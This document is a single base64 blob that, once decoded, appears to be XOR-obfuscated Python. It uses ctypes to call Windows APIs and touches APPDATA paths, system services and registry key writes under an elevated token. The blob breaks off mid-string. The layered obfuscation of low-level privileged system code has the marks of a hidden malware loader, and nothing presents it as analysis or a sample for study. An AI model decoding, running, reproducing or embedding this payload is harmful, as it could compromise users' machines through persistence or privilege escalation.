QZWVZaUhcWChcVWUMVDT0XFxcXRE5EGVJPXkMfBx49PV5aR1hFQxdUQ05HUkQ9PXZnZ3N+ZRcKF1hEGVJZQV5FWFlsFXt4dHZ7dmdnc3ZjdhVqFxwXFWtrel5URVhEWFFDa2tgXllTWEBEa2t2R0d/WERDFT1yb3JoeXZ6chcKF1hEGVJZQV5FWFkZUFJDHxVyb3R7aHJvchUbFxVDQllQGVJPUhUePT1ofRcKFxUVGV1YXlk9FBdFQllDXlpSGlZERFJaVVtSUxdDWFxSWUQXH1lSQVJFF0BfWFtSF15ZF0NST0MeGRdFBgMDF3F+cntzF3VicA0XQ19eRBdCRFJTF0NYPRQXRENWRUMXQF5DXxdDX1IXW15DUkVWWxcVf3x7ehUXQF9eW1IXQ19SF19WWVNbUhdHVkREUlMXQ1gXZVJQdEVSVkNSfFJOck9gF0BWRD0UF1ZbRVJWU04Xf3xybmh7eHR2e2h6dnR/fnlyF9W3oxdSQVJFThdBVltCUhdbVllTUlMXXlkXVhdHX1ZZQ1haPRQXf3x7emt/fHt6axkZGRdcUk4XQ19WQxdZWBdYWVIXRVJWU0QbF0NfUhdEVEVeR0MQRBdYQFkXRVJWUxpVVlRcFx9EVlpSF0BFWFlQPRQXR1ZDXx4XVllEQFJFUlMXFUBFXkNDUlkVGxdWWVMXQFhFXBlHThBEF1RfUlRcF1hRF0NfUhdlcnZ7F1xSThdWWURAUkVSUz0UFxVaXkREXllQFRdYWRdSQVJFThdVWFhDGRdDX1IXXFJOF19SRVIXXkQXQ19SF0RCVVxSThdYWVtOGxdaVkNUX15ZUBdAWEVcGUdOGT18BhcKF2h9Hx8VZHhxY2B2ZXIVGxdUX0UfDgUeFxwXFXpeVEVYRFhRQxUbF1RfRR8OBR4XHD0XFxcXFxcXFxcVYF5ZU1hARBcVGxdofR8fFXNSURUbFxVSFRsXFVlTUkUVHh4bF1RfRR8OBR4eHj1yb3R7FwoXaH0fHxVyFRsXFU9UW0IVGxcVRF5YWUQVGxdUX0UfDgUeHh49fGd2Y38XChd8BhccF3JvdHsXHBdofR8fFWdWFRsXFUNfRBUeHj18Z2V4dBcKF3wGFxwXcm90exccF2h9Hx8VZ0VYFRsXFVRSFRsXFUREUkQVHh49PX98e3oXChcHTw8HBwcHBwcFPXxybmhgZX5jchcKFwdPBQcHBwE9ZXJwaGRtFwoXBj1lZXFodnluFwoXB08HBwcHcXFxcT09PVNSURdSW1JBHx4NPRcXFxcVFRV/fnB/F15ZQ1JQRV5DThsXWVhDF1pSRVJbThcVQ19SF0JEUkUXXkQXVlkXVlNaXlkVDRdWF2J2dBpRXltDUkVSUxdWU1peWT0XFxcXQ1hcUlkXR1ZERFJEF0NfUhdQRVhCRxdUX1JUXBdWWVMXQ19SF1JPVFtCRF5YWRdcUk4QRBdzdnR7F0VSUUJEUkQXXkMZF0NfUj0XFxcXRVJWWxdGQlJEQ15YWRdeRBdjWFxSWXJbUkFWQ15YWRcfcFJDY1hcUll+WVFYRVpWQ15YWRdUW1ZERBcGDx4ZF0UGAwM9FxcXFx9TXRdRXlJbUw0XWVhDX15ZUBdSQVJFF1tWWVNSUx4X1bejF1lYF0BFXkNSF15EF1ZDQ1JaR0NSUxdVUltYQBdDX15EF1teWVIbPRcXFxdWWVMXWlZeWR8eF0VSR1hFQ0QXXkMXXlkXQ19SF1JPXkMXVFhTUhdEWBdDX1IXRENWUFIXVFZZF0NSW1sXQ19SF0NAWD0XFxcXUVZeW0JFUkQXVkdWRUMXHwUXChdDWFxSWRsXBhcKF0NfUhdEQ1hFUhdFUlFCRFJTF0NfUhdARV5DUh4ZFRUVPRcXFxdDRU4NPRcXFxcXFxcXXBcKF1RDTkdSRBlAXllTW1sZXFJFWVJbBAU9FxcXFxcXFxdWFwoXVENOR1JEGUBeWVNbWxlWU0FWR14EBT0XFxcXFxcXF1YZeEdSWWdFWFRSRERjWFxSWRlFUkRDTkdSFwoXVENOR1JEGVRoW1hZUD0XFxcXFxcXF1YZeEdSWWdFWFRSRERjWFxSWRlWRVBDTkdSRBcKF2xUQ05HUkQZVGhBWF5TaEcbF1RDTkdSRBlUaEJbWFlQGz0XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxdUQ05HUkQZZ3h+eWNyZR9UQ05HUkQZVGhBWF5TaEceaj0XFxcXFxcXF18XChdUQ05HUkQZVGhBWF5TaEcfHj0XFxcXFxcXF15RF1lYQxdWGXhHUllnRVhUUkREY1hcUlkfVENOR1JEGVRoQVheU2hHHxoGHhsXB08HBwcPGxdUQ05HUkQZVU5FUlEfXx4eDT0XFxcXFxcXFxcXFxdFVl5EUhd4ZHJFRVhFHxVDWFxSWRUePRcXFxcXFxcXQVZbFwoXVENOR1JEGVRoQltYWVAfBx49FxcXFxcXFxdZUlJTFwoXVENOR1JEGVRoQltYWVAfBx49FxcXFxcXFxdFVBcKF1YZcFJDY1hcUll+WVFYRVpWQ15YWR9fGxcGDxsXVENOR1JEGVVORVJRH0FWWx4bFwMbF1RDTkdSRBlVTkVSUR9ZUlJTHh49FxcXFxcXFxdDRU4NPRcXFxcXFxcXFxcXF1wZdFtYRFJ/VllTW1IfXx49FxcXFxcXFxdST1RSR0MXck9UUkdDXlhZDT0XFxcXFxcXFxcXFxdHVkREPRcXFxcXFxcXXlEXRVQNPRcXFxcXFxcXFxcXF0VSQ0JFWRdBVlsZQVZbQlIXCgoXBj0XFxcXUk9UUkdDF3JPVFJHQ15YWQ09FxcXFxcXFxdHVkREPRcXFxdDRU4NPRcXFxcXFxcXRVJDQkVZF1BSQ1ZDQ0UfVENOR1JEGUBeWVNbWxlEX1JbWwQFGxdofR8fFX5EFRsXFWJEUkUVGxcVdlkVGxcVdlNaXlkVHh4eHx4XFgoXBz0XFxcXUk9UUkdDF3JPVFJHQ15YWQ09FxcXFxcXFxdFUkNCRVkXcVZbRFI9PT1TUlEXaFZTQVZHXh8eDT0XFxcXVhcKF1RDTkdSRBlAXllTW1sZVlNBVkdeBAU9FxcXF0NFTg09FxcXFxcXFxdWGWVSUHRFUlZDUnxSTnJPYBlFUkRDTkdSFwoXVENOR1JEGVRoW1hZUD0XFxcXFxcXF1YZZVJQdEVSVkNSfFJOck9gGVZFUENOR1JEFwoXbD0XFxcXFxcXFxcXFxdUQ05HUkQZVGhBWF5TaEcbF1RDTkdSRBlUaEBUX1ZFaEcbF1RDTkdSRBlUaEJbWFlQGxdUQ05HUkQZVGhAVF9WRWhHGz0XFxcXFxcXFxcXFxdUQ05HUkQZVGhCW1hZUBsXVENOR1JEGVRoQltYWVAbF1RDTkdSRBlUaEFYXlNoRxs9FxcXFxcXFxcXFxcXVENOR1JEGWd4fnljcmUfVENOR1JEGVRoQVheU2hHHhsXVENOR1JEGWd4fnljcmUfVENOR1JEGVRoQltYWVAeaj0XFxcXFxcXF1YZZVJQZFJDYVZbQlJyT2AZRVJEQ05HUhcKF1RDTkdSRBlUaFtYWVA9FxcXFxcXFxdWGWVSUGRSQ2FWW0JSck9gGVZFUENOR1JEFwoXbD0XFxcXFxcXFxcXFxdUQ05HUkQZVGhBWF5TaEcbF1RDTkdSRBlUaEBUX1ZFaEcbF1RDTkdSRBlUaEJbWFlQGxdUQ05HUkQZVGhCW1hZUBs9FxcXFxcXFxcXFxcXVENOR1JEGVRoVF9WRWhHGxdUQ05HUkQZVGhCW1hZUGo9FxcXFxcXFxdWGWVSUHBSQ2FWW0JSYBlFUkRDTkdSFwoXVENOR1JEGVRoW1hZUD0XFxcXFxcXF1YZZVJQcFJDYVZbQlJgGVZFUENOR1JEFwoXbD0XFxcXFxcXFxcXFxdUQ05HUkQZVGhBWF5TaEcbF1RDTkdSRBlUaEBUX1ZFaEcbF1RDTkdSRBlUaEBUX1ZFaEcbF1RDTkdSRBlUaEJbWFlQGz0XFxcXFxcXFxcXFxdUQ05HUkQZVGhBWF5TaEcbF1RDTkdSRBlUaEFYXlNoRxsXVENOR1JEGWd4fnljcmUfVENOR1JEGVRoQltYWVAeaj0XFxcXFxcXF1YZZVJQdFtYRFJ8Uk4ZVkVQQ05HUkQXChdsVENOR1JEGVRoQVheU2hHaj0XFxcXUk9UUkdDF3JPVFJHQ15YWQ09FxcXFxcXFxdHVkREPRcXFxdFUkNCRVkXVj09PVNSURdEUkNoQVZbQlIfXFJOGxdZVlpSHg09FxcXFxUVFUBFXkNSF1lWWlIKBxcfZXJwaGRtGxdDX1IXVU5DUhdDX1IXVFpTW1JDF1tSVkFSRB4XQllTUkUXXFJOGRUVFT0XFxcXVhcKF2hWU0FWR14fHj0XFxcXXxcKF1RDTkdSRBlUaEFYXlNoRx8ePRcXFxdTXkRHFwoXVENOR1JEGVRoQltYWVAfHj0XFxcXXlEXVhllUlB0RVJWQ1J8Uk5yT2AfVENOR1JEGVRoQVheU2hHH398e3oeGxdcUk4bFwcbF3lYWVIbFwcbF3xybmhgZX5jchs9FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF3lYWVIbF1RDTkdSRBlVTkVSUR9fHhsXVENOR1JEGVVORVJRH1NeREceHhcWChcHDT0XFxcXFxcXF0VSQ0JFWRdxVltEUj0XFxcXU1ZDVhcKFx9EQ0UfWVZaUh4XHBcVa08HBxUeGVJZVFhTUh8VQkNRGgYBGltSFR49FxcXF0VUFwoXVhllUlBkUkNhVltCUnJPYB9fGxdEQ0UfWVZaUh4bFwcbF2VycGhkbRsXU1ZDVhsXW1JZH1NWQ1YeHj0XFxcXQ0VODT0XFxcXFxcXF1YZZVJQdFtYRFJ8Uk4fXx49FxcXF1JPVFJHQxdyT1RSR0NeWFkNPRcXFxcXFxcXR1ZERD0XFxcXRVJDQkVZF0VUFwoKFwc9PT1TUlEXX1ZEaEFWW0JSH1xSThsXWVZaUh4NPRcXFxdWFwoXaFZTQVZHXh8ePRcXFxdVQlEXChdUQ05HUkQZVEVSVkNSaEJZXlRYU1JoVUJRUVJFHw8ePRcXFxdETRcKF1RDTkdSRBlUaEJbWFlQHwYBHj0XFxcXQ0VODT0XFxcXFxcXF0VUFwoXVhllUlBwUkNhVltCUmAfVENOR1JEGVRoQVheU2hHH398e3oeGxdcUk4bF0RDRR9ZVlpSHhsXZWVxaHZ5bhs9FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF3lYWVIbF1VCURsXVENOR1JEGVVORVJRH0RNHh49FxcXF1JPVFJHQxdyT1RSR0NeWFkNPRcXFxcXFxcXRVJDQkVZF3FWW0RSPRcXFxdFUkNCRVkXRVQXCgoXBz09PVNSURdaVkVcUkVoR1ZDX0QfHg09FxcXFxUVFUNfUhdUR0cXRVJbWFRWQ15YWRdaVkVcUkUNF0VSW1hUVkNSUxdST1IXR1ZDXxcfW15ZUh4X1bejF0NFUlZDUlMXVkQXVVhDXz0XFxcXVhdHRVhUUkREF1JPVFtCRF5YWRdWWVMXXkNEF0dWRVJZQxdTXkUXVkQXVhdHVkNfF1JPVFtCRF5YWRkVFRU9FxcXF1hCQ2hST1JEFwoXbGo9FxcXF0NFTg09FxcXFxcXFxdAXkNfF1hHUlkfdmdnc35lFxwXVF9FHw4FHhccFxVFUltYVFZDXlhZRBlDT0MVGxcVRRUbPRcXFxcXFxcXFxcXFxcXFxcXF1JZVFhTXllQChVCQ1EaDxUbF1JFRVhFRAoVRVJHW1ZUUhUeF1ZEF1FfDT0XFxcXFxcXFxcXFxdRWEUXW15ZUhdeWRdRXw09FxcXFxcXFxcXFxcXFxcXF0cXChdbXllSGURDRV5HHx49FxcXFxcXFxcXFxcXFxcXF15RF0cXVllTF0cZW1hAUkUfHhlSWVNEQF5DXx8VGVJPUhUeDT0XFxcXFxcXFxcXFxcXFxcXFxcXF1hCQ2hST1JEGVZHR1JZUx9HHj0XFxcXUk9UUkdDF3JPVFJHQ15YWQ09FxcXFxcXFxdHVkREPRcXFxdFUkNCRVkXWEJDaFJPUkQ9PT1TUlEXUlNQUkJHU1ZDUmhHVkNfRB8eDT0XFxcXFRUVRQQPFx9TXR4X1bejF3V4Y38XclNQUmJHU1ZDUhdfWFpSRBsXX1ZFU1RYU1JTGxdaVkVcUkUaXllTUkdSWVNSWUMNPRcXFxcXFxoXQ19SF0VYVlpeWVAXRF5TUhpfWFpSFx8Sdmdnc3ZjdhIXQ1hAVkVTF3JTUFJiR1NWQ1IePRcXFxcXFxoXQ19SF2dFWFBFVlpzVkNWF1RYR04QRBdfWFpSPRcXFxdSQVJFThcdGVJPUhdeWUReU1IXUlZUXxdfWFpSF11YXllEF1ZEF1YXR0VYVFJERBdST1RbQkReWFkZFRUVPRcXFxdTXkVEGxdST1JEFwoXbGobF2xqPRcXFxdVRBcKF1RfRR8OBR49FxcXF1JCFwoXaH0fHxVyUxUbFxVQUhUbFxViRxUbFxVTVkNSFR4ePRcXFxdfWFpSRBcKF2xYRBlSWUFeRVhZGVBSQx8Vdmdnc3ZjdhUbFxUVHhccF1VEFxwXUkIbPRcXFxcXFxcXFxcXFxcVdA0VFxwXVUQXHBcVZ0VYFRccFxVQRVZac1ZDVhUXHBdVRBccF1JCaj0XFxcXUVhFF1VWRFIXXlkXX1haUkQNPRcXFxcXFxcXXlEXWVhDF1VWRFIXWEUXWVhDF1VWRFIZUllTREBeQ18fUkIeDT0XFxcXFxcXFxcXFxdUWFlDXllCUj0XFxcXFxcXF0NFTg09FxcXFxcXFxcXFxcXXlEXWEQZR1ZDXxleRFNeRR9VVkRSHg09FxcXFxcXFxcXFxcXFxcXF1NeRUQZVkdHUllTH1VWRFIePRcXFxcXFxcXFxcXFxcXFxdRWEUXWRdeWRdEWEVDUlMfWEQZW15EQ1NeRR9VVkRSHh5sDQEDag09FxcXFxcXFxcXFxcXFxcXFxcXFxdeURdZGVtYQFJFHx4ZUllTREBeQ18fFRlST1IVHg09FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXUk9SRBlWR0dSWVMfVVZEUhccF1VEFxwXWR49FxcXFxcXFxdST1RSR0MXck9UUkdDXlhZDT0XFxcXFxcXFxcXFxdHVkREPRcXFxdFUkNCRVkXU15FRBsXUk9SRD09PVNSURdYQkVoRVhYQ0QfHg09FxcXFxUVFVNdFx9DX15EF1VCXltTHhfVt6MXQ19SF1ZHRxBEF1hAWRdbVllSRBsXW15EQxpTRV5BUlkXW15cUhdDX1IXRFleR0dSQxdfUj0XFxcXX1ZZU1JTF1hBUkUbF1VCQxdaVkdHUlMXQ1gXQF9SRVIXY39+ZBdHVk5bWFZTF1teQVJEDT0XFxcXFxcXFxJ7eHR2e3ZnZ3N2Y3YSFxcXFxcXFxcXFxcXFxcXFxdSQVJFTkNfXllQF0BSF0RDVlBSFx92R0d/WERDGxdHTkNfWFkEBgUePRcXFxcXFxcXEnZnZ3N2Y3YSFxcXFxcXFxcXFxcXFxcXFxcXFxcXF0NfUhdFWFZaXllQF0ReU1IaX1haUhdAUhdaXkVFWEUXXllDWD0XFxcXFxcXF3ZHR39YREMXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxdDX1IXW1ZCWVRfUkUXU15FPRcXFxcXFxcXdkdHf1hEQ2trR05DX1hZBAYFFxcXFxcXFxcXFxcXF0NfUhdeWUNSRUdFUkNSRRdDX1ZDF0VCWUQXQ19SF0RDVlBSPRcXFxdHW0JEF0NfUhdeWUNSRUdFUkNSRRdWRBdWF2dleHRyZGQXUk9UW0JEXlhZF9W3oxdDX1IXW15RQ1JTF0RDVlBSF1JPUlRCQ1JEPRcXFxdCWVNSRRdHTkNfWFlAGVJPUhsXRFgXVhdEVFZZF0NfVkMXRVJEWFtBUkQXQ19SF1VWRVIXXlpWUFIXWVZaUhdfVkQXQ1gXWl5ERD0XFxcXXkMXVkQXQFJbWxsXWVhDF11CREMXQ19SF1NeRVJUQ1hFThdeQxdEXkNEF15ZGRUVFT0XFxcXVUQXChdUX0UfDgUePRcXFxdbVhcKF1hEGVJZQV5FWFkZUFJDHxV7eHR2e3ZnZ3N2Y3YVGxcVFR49FxcXF1ZTFwoXWEQZUllBXkVYWRlQUkMfFXZnZ3N2Y3YVGxcVFR49FxcXF0dOFwoXaH0fHxVHThUbFxVDX1hZFR4ePRcXFxdHTlNeRRcKF3ZnZ3N+ZRccF1VEFxwXaH0fH0dOGxcVBAYFFR4ePRcXFxdTXkVEGxdST1JEFwoXbGobF2xqPRcXFxdRWEUXUxdeWRcfdmdnc35lGxdHTlNeRRsXW1YbF1ZTHg09FxcXFxcXFxdeURdTF1ZZUxdTF1lYQxdeWRdTXkVEDT0XFxcXFxcXFxcXFxdTXkVEGVZHR1JZUx9THj0XFxcXUVhFF1kXXlkXH0dOFxwXFRlST1IVGxdHThccFxVAGVJPUhUeDT0XFxcXFxcXF1FYRRdHF15ZFx9ZGxdHTlNeRRccF1VEFxwXWR4NPRcXFxcXFxcXFxcXF15RF0cXWVhDF15ZF1JPUkQNPRcXFxcXFxcXFxcXFxcXFxdST1JEGVZHR1JZUx9HHj0XFxcXRVJDQkVZF1NeRUQbF1JPUkQ9PT1TUlEXR0VYUEVWWlNWQ1ZoUUVYWmhaVkVcUkUfUk9SRB4NPRcXFxcVFRVaVkVcUkUXU15FRA0XQ19SF0dWRVJZQxdYURdSQVJFThdFUltYVFZDUlMXUk9SGRUVFT0XFxcXU15FRBcKF2xqPRcXFxdRWEUXTxdeWRdST1JEDT0XFxcXFxcXF1MXChdPGUVER1teQx9UX0UfDgUeGxcGHmwHaj0XFxcXFxcXF15RF1MXVllTF1MXWVhDF15ZF1NeRUQNPRcXFxcXFxcXFxcXF1NeRUQZVkdHUllTH1MePRcXFxdFUkNCRVkXU15FRD09PVNSURdQVkdEH1NeRUQbF1JPUkQeDT0XFxcXFRUVQF9WQxdDX1IXRENYRVIXU1hSRBd5eGMXRF9YQBdFXlBfQxdZWEAZFRUVPRcXFxdaUxcKF2xTF1FYRRdTF15ZF1NeRUQXXlEXWVhDF19WRGhBVltCUh98Z3ZjfxsXUx5qPRcXFxdaTxcKF2xPF1FYRRdPF15ZF1JPUkQXXlEXWVhDF19WRGhBVltCUh98Z2V4dBsXTx5qPRcXFxdFUkNCRVkXWlMbF1pPPT09U1JRF0BFXkNSaEVSUB9TXkVEGxdST1JEHg09FxcXFxUVFUdWREQXBg0XQ19SF1xSThdeQ0RSW1EbF15ZGkdFWFRSREQZF0BFXkNWVVtSF1hZW04XQF9SRVIXQ19SF0RDWEVSF15EPRcXFxdZWEMXRFJFQV5UUhpHRVhDUlRDUlMMF1YXRVJRQkRSUxdBVltCUhdEXlpHW04XWVJBUkUXVkdHUlZFRBcfWVgXRVZeRFIeGRUVFT0XFxcXUVhFF1MXXlkXU15FRA09FxcXFxcXFxdEUkNoQVZbQlIffGd2Y38bF1MePRcXFxdRWEUXTxdeWRdST1JEDT0XFxcXFxcXF0RSQ2hBVltCUh98Z2V4dBsXTx49PT0UFxoaGhoXR1ZERBcFDRdDX1IXRFJFQV5UUhd2Z34bF15ZGkdFWFRSREQXGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGho9FBdFBgMDFx9TXQ0XRENeW1sXWVhDF1tWWVNeWVAbF1pWXFIXREJFUhdeQxdFQllEF0BeQ18XVlNaXlkeDRdWF0dFWENSVENSUxdEQ1hFUj0UF0VSUUJEUkQXQ19SF1xSThdARV5DUhdSQVJZF1FYRRdWWRdSW1JBVkNSUxdDWFxSWRsXVllTF0NfUhdEUkVBXlRSF15QWVhFUkQXVj0UF1RWW1tSRRdVUltYQBd/fnB/F9W3oxdDX1ZDF15EF0BfThdZWENfXllQF0RfWEBSUxdCRxkXdlNTGnpHZ0VSUVJFUllUUhdAWEVcRBdYWT0UF0NfUkRSF1VYT1JEF1VSVFZCRFIXXkMXUFhSRBdDWBdDX1IXZHJlYX50chsXWVhDF0NfUhdcUk4MF0NfXkQXU0VeQVJEF0NfUhdEVlpSPRQXWlJDX1hTFx96ZHFjaHpHZ0VSUVJFUllUUhl2U1MeF1hBUkUXdHh6F15ZF0NfXkQXQVJFThdHRVhUUkREDRdZWBdHWEBSRURfUltbGz0UF1lYF1RfXltTGxdZWBdUWFpaVllTF1teWVIXH0UGBAAeGxdWWVMXXkMXW1ZZU0QXQF9SRVIXQ19SF1xSThdFUlFCRFJEGT09U1JRF2hQQl5TH0NST0MeDT0XFxcXVFtWREQXcB9UQ05HUkQZZENFQlRDQkVSHg09FxcXFxcXFxdoUV5SW1NEaBcKF2wfFVMGFRsXVENOR1JEGVRoQltYWVAeGxcfFVMFFRsXVENOR1JEGVRoQkRfWEVDHhs9FxcXFxcXFxcXFxcXFxcXFxcXFxcfFVMEFRsXVENOR1JEGVRoQkRfWEVDHhsXHxVTAxUbF1RDTkdSRBlUaEJVTkNSFx0XDx5qPRcXFxdQFwoXcB8ePRcXFxdHFwoXQ1JPQxlEQ0VeRx8VTEoVHhlER1teQx8VGhUePRcXFxdQGVMGGxdQGVMFGxdQGVMEFwoXXllDH0dsB2obFwYBHhsXXllDH0dsBmobFwYBHhsXXllDH0dsBWobFwYBHj0XFxcXQ1ZeWxcKF0dsBGoXHBdHbANqPRcXFxdRWEUXXhdeWRdFVllQUh8PHg09FxcXFxcXFxdQGVMDbF5qFwoXXllDH0NWXltsXhcdFwUNXhcdFwUXHBcFahsXBgEePRcXFxdFUkNCRVkXUD09PVNSURdoWlJDX1hTH0dDRRsXXlNPGxcdVkVQQ05HUkQeDT0XFxcXFRUVQUNWVVtSF19YRw0XRFtYQxdeU08XWFEXVhd0eHoXXllDUkVRVlRSGxdXQ19eRFcXVltAVk5EF1FeRURDGRUVFT0XFxcXQ1ZVW1IXChdUQ05HUkQZVFZEQx9HQ0UbF1RDTkdSRBlneH55Y3JlH1RDTkdSRBlneH55Y3JlH1RDTkdSRBlUaEFYXlNoRx4eHmwHaj0XFxcXR0VYQ1gXChdUQ05HUkQZYH55cWJ5dGNuZ3IfVENOR1JEGVRoW1hZUBsXVENOR1JEGVRoQVheU2hHGxcdVkVQQ05HUkQePRcXFxdFUkNCRVkXR0VYQ1gfQ1ZVW1JsXlNPah49PT1TUlEXaFVEH1hWGxdfUltTGxdDUk9DHg09FxcXF0cXChdYVhlkTkR2W1tYVGRDRV5ZUB9DUk9DHj0XFxcXXlEXWVhDF0cNPRcXFxcXFxcXRVZeRFIXelJaWEVOckVFWEUfFVVEQ0UVHj0XFxcXX1JbUxlWR0dSWVMfRx49FxcXF0VSQ0JFWRdHPT09U1JRF2hBVkVeVllDH1hWGxdfUltTGxdVQlFEGxdeQ1JaRB4NPRcXFxcVFRVhdmV+dnljFx9hY2h2ZWV2bkthY2h1ZGNlHhdYQVJFF1YXWFlSGlNeWlJZRF5YWRdkdnFydmVldm4XWFEXdWRjZUQZFRUVPRcXFxdUW1ZERBd1H1RDTkdSRBlkQ0VCVENCRVIeDT0XFxcXFxcXF2hRXlJbU0RoFwoXbB8VWRUbF1RDTkdSRBlUaEJbWFlQHhsXHxVbWBUbF1RDTkdSRBlUaFtYWVAeaj09FxcXF1UXChd1H1tSWR9eQ1JaRB4bFwcePRcXFxdEVhcKF1hWGWRWUVJ2RUVWTnRFUlZDUh8PGxcGGxdUQ05HUkQZVU5FUlEfVR4eFxcXFxcUF2FjaHVkY2UbFwYXU15aPRcXFxdeURdZWEMXRFYNPRcXFxcXFxcXRVZeRFIXelJaWEVOckVFWEUfFURWUVJWRUVWThUePRcXFxdRWEUXXhsXXkMXXlkXUllCWlJFVkNSH15DUlpEHg09FxcXFxcXFxdeU08XChdUQ05HUkQZVGhbWFlQH14ePRcXFxcXFxcXXlEXWFYZZFZRUnZFRVZOZ0JDcltSWlJZQx9UQ05HUkQZVGhBWF5TaEcfRFYeGxdUQ05HUkQZVU5FUlEfXlNPHhs9FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF1RDTkdSRBlUaEFYXlNoRx9oVUQfWFYbF19SW1MbF15DHh4eFxYKFwcNPRcXFxcXFxcXFxcXF0VWXkRSF3pSWlhFTnJFRVhFHxVEVlFSVkVFVk4XR0JDFR49FxcXF0FWRRcKF1RDTkdSRBlURVJWQ1JoRENFXllQaFVCUVFSRR8FAx4XFxcXFxcXFxcXFxcXFxQXYXZlfnZ5YxsXAQMaVV5DPRcXFxdUQ05HUkQZVGhCRF9YRUMZUUVYWmhVQlFRUkUfQVZFGxcHHhlBVltCUhcKFwdPBQcHDxcXFBdhY2h2ZWV2bhdLF2FjaHVkY2U9FxcXF1RDTkdSRBlUaEFYXlNoRxlRRVhaaFVCUVFSRR9BVkUbFw8eGUFWW0JSFwoXRFY9FxcXF1VCUUQZVkdHUllTHx9BVkUbF0RWHh49FxcXF0VSQ0JFWRdUQ05HUkQZVFZEQx9BVkUbF1RDTkdSRBlUaEFYXlNoRx49PT1TUlEXR0VSUWhWU1MfU15FRBsXUk9SRB4NPRcXFxcVFRV6ZHFjaHpHZ0VSUVJFUllUUhl2U1Mfck9UW0JEXlhZZ1ZDXxsXck9UW0JEXlhZZ0VYVFJERB4XWEFSRRdbWFRWWxd0eHoZPRcXFxdDRUJSF1hZW04XQF9SWRdDX1IXZHJlYX50chdWVFRSR0NSUxdDX1IXVFZbWxcff2VyZGJ7YxcHHhkVFRU9FxcXF15RF1lYQxdTXkVEF1ZZUxdZWEMXUk9SRA09FxcXFxcXFxdFUkNCRVkXY0VCUj0XFxcXWFsXChdUQ05HUkQZQF5ZU1tbGVhbUgQFPRcXFxdYVhcKF1RDTkdSRBlAXllTW1sZWFtSVkJDBAU9FxcXF1hWGWRORHZbW1hUZENFXllQGUVSRENOR1IXChdUQ05HUkQZVGhBWF5TaEc9FxcXF1hWGWRORHZbW1hUZENFXllQGVZFUENOR1JEFwoXbFRDTkdSRBlUaEBUX1ZFaEdqPRcXFxdYVhlkTkRxRVJSZENFXllQGVZFUENOR1JEFwoXbFRDTkdSRBlUaEFYXlNoR2o9FxcXF1hWGWRWUVJ2RUVWTnRFUlZDUhlFUkRDTkdSFwoXVENOR1JEGVRoQVheU2hHPRcXFxdYVhlkVlFSdkVFVk50RVJWQ1IZVkVQQ05HUkQXChdsVENOR1JEGVRoQkRfWEVDGxdUQ05HUkQZVGhCW1hZUBsXVENOR1JEGVRoQVheU2hHaj0XFxcXWFYZZFZRUnZFRVZOZ0JDcltSWlJZQxlFUkRDTkdSFwoXVENOR1JEGVRoW1hZUD0XFxcXWFYZZFZRUnZFRVZOZ0JDcltSWlJZQxlWRVBDTkdSRBcKF2xUQ05HUkQZVGhBWF5TaEcbF1RDTkdSRBlUaEFYXlNoRxs9FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXVENOR1JEGVRoQVheU2hHaj0XFxcXWFYZZFZRUnZFRVZOc1JEQ0VYThlWRVBDTkdSRBcKF2xUQ05HUkQZVGhBWF5TaEdqPRcXFxdYWxl0WH5ZXkNeVlteTVJyTxlFUkRDTkdSFwoXVENOR1JEGVRoW1hZUD0XFxcXWFsZdFh+WV5DXlZbXk1Sck8ZVkVQQ05HUkQXChdsVENOR1JEGVRoQVheU2hHGxdUQ05HUkQZVGhCW1hZUGo9FxcXF1hbGXRYdEVSVkNSfllEQ1ZZVFIZRVJEQ05HUhcKF1RDTkdSRBlUaFtYWVA9FxcXF1hbGXRYdEVSVkNSfllEQ1ZZVFIZVkVQQ05HUkQXChdsVENOR1JEGVRoQVheU2hHGxdUQ05HUkQZVGhBWF5TaEcbPRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF1RDTkdSRBlUaEJbWFlQGxdUQ05HUkQZVGhBWF5TaEcbPRcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF1RDTkdSRBlneH55Y3JlH1RDTkdSRBlUaEFYXlNoRx5qPT0XFxcXX1JbUxsXVUJRRBcKF2xqGxdsaj0XFxcXR2hbWFQXChdUQ05HUkQZVGhBWF5TaEcfHj0XFxcXR2hEQVQXChdUQ05HUkQZVGhBWF5TaEcfHj0XFxcXR2hUW0QXChdUQ05HUkQZVGhBWF5TaEcfHj0XFxcXR2hEXlAXChdUQ05HUkQZVGhBWF5TaEcfHj0XFxcXR2hYQkMXChdUQ05HUkQZVGhBWF5TaEcfHj0XFxcXR2heWUQXChdUQ05HUkQZVGhBWF5TaEcfHj0XFxcXWFwXChdxVltEUj0XFxcXXlleQ1JTFwoXcVZbRFI9FxcXF0NFTg09FxcXFxcXFxdYWxl0WH5ZXkNeVlteTVJyTx95WFlSGxcFHhcXFxcXFxcXFxcUF3ZndmVjenJ5Y2N/ZXJ2c3JzDBdkaHF2e2RyF15EF1FeWVI9FxcXFxcXFxdeWV5DUlMXChdjRUJSPRcXFxcXFxcXXlEXWFsZdFh0RVJWQ1J+WURDVllUUh9UQ05HUkQZVU5FUlEfaFBCXlMfFQMCDgdRDwYGGgZTBFYaBgZTBxoPDgZRGgcHVlYHBwNVBVIFAxUeHhs9FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF3lYWVIbFwYbFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcUF355Z2V4dGhkcmVhcmU9FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF1RDTkdSRBlVTkVSUR9oUEJeUx8VU1QGBVYBDwAaAAQAURoGBlRRGg8PA1MaBwdWVgcHA1UFUgUDFR4eGz0XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXVENOR1JEGVVORVJRH0doW1hUHh4XFgoXBxdYRRdZWEMXR2hbWFQNPRcXFxcXFxcXFxcXF0VSQ0JFWRdxVltEUj0XFxcXFxcXF1RYWVlSVEMXChdoWlJDX1hTH0doW1hUGxcEGxdUQ05HUkQZVGhBWF5TaEcbF1